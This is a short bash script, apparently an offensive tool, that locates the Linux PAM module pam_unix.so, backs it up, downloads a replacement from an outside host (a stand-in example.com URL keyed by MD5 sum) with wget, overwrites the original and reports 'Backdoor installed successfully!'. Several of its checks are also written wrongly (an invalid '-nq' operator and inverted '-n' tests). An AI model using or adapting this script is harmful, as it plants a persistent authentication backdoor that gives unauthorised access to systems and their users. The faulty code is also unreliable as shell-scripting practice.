#!/bin/bash

HOST="http://example.com/"

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

make_backup () {
    cp $1 ${1}.bak
    if [ $? -nq 0 ]; then
        echo "Failed making backup of pam_unix.so!"
        exit
    fi
}

find_pam () {
    pam="$(find /lib/ -name pam_unix.so -print 2>/dev/null)"
    if [ -n $pam ]; then
        echo "Failed to find pam_unix.so!"
        exit
    else
        echo ${pam}
    fi
}

get_pam () {
    wget "${HOST}${1}" -O ${pam}
    if [ $? -nq 0]; then
        echo "Failed to install pam_unix.so!"
        exit
    fi
}

md5_sum () {
    md5="$(md5sum ${1} | awk '{ print $1 }' )"
    if [ -n $md5 ]; then
        echo "Failed to calculate MD5 sum!"
        exit
    else
        echo ${md5}
    fi
}

main () {
    echo "Finding pam_unix.so..."
    find_pam

    echo "Calculating MD5 sum..."
    md5_sum ${pam}

    echo "Making backup in case something fails..."
    make_backup ${pam}
    echo "Backup created: ${pam}.bak"

    echo "Downloading and replacing pam..."
    get_pam ${md5}
    echo "Backdoor installed successfully!"
}

main
